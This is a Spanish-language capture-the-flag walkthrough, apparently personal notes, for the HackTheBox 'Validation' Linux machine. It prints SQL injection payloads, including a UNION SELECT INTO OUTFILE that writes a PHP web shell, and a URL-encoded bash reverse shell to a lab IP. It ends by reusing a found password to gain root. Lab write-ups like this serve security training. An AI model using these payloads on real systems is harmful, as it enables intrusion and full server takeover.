maquina validation htb --- --- -- ------- - linux 

aprendizaje 

Web
Injection
MySQL
Penetration Tester Level 1
Reconnaissance
SQL Injection
Misconfiguration

-------------- -- -- -- -- -- 

esta maquina tiene la gran mayoria de cosas en inyeccion sql, el tema esta en inyectar un comando
para uqe se pueda crear un archivo en la carpeta principal donde se esta exponiendo la web 

asi puedes mandarle un shell por php ya que hemos visto que la web esta corriendo archivos php 

lo que tenemos que haces es capturar la peticion con burpsuit y poder ver el numero de tablas que tiene
en la base de datos... 

username=adsf&country=Brazil' order by 1-- -

con eso podemos ver que solamente corre una columna, si no nos estaria dando error
son inyecciones a base de error...

sabiendo eso vamos a jugar con el union select

username=adsf&country=Brazil' union select 1-- -

como no nos da error podemos intentar inyectarle otro comando

username=adsf&country=Brazil' union select "probando"-- -

y la pagina nos devuelve "probando" 

por lo tanto ahora vamos a decirle que eso mismo nos lo meta en un archivo en la carpeta 
/var/www/html

username=adsf&country=Brazil' union select "probando" into outfile "/var/www/html/probando.txt"-- -

accedemos desde la pagina y vemos que tenemos el archivo dentro ahora solo tenemos que meterle un archivo
que sea en php que nos arroje una consola desde la url... es sencillo 

username=adsf&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/s.php"-- -

con ese comando le hemos mitido ese archivo que al acceder desde la url podemos seguir con esto 

http://10.10.11.116/loquesea.php?cmd=whoami

al ver que nos contesta solo tenemos que meterle la bash encodeada en url para uqe le guste 

http://10.10.11.116/loquesea.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.57/443+0%3E%261%27

y con eso y un puerto de escucha tenemos la bash interactiva

hemos visto que la misma carpeta donde estamos tenemos un archivo con nombre y contraseña 

pero no tenemos mas usuarios en la maquina solo www-data y root 

como no nos queda otra que reciclar contras hemos probado a meternos a root con la contraseña y listo. tenemos todo



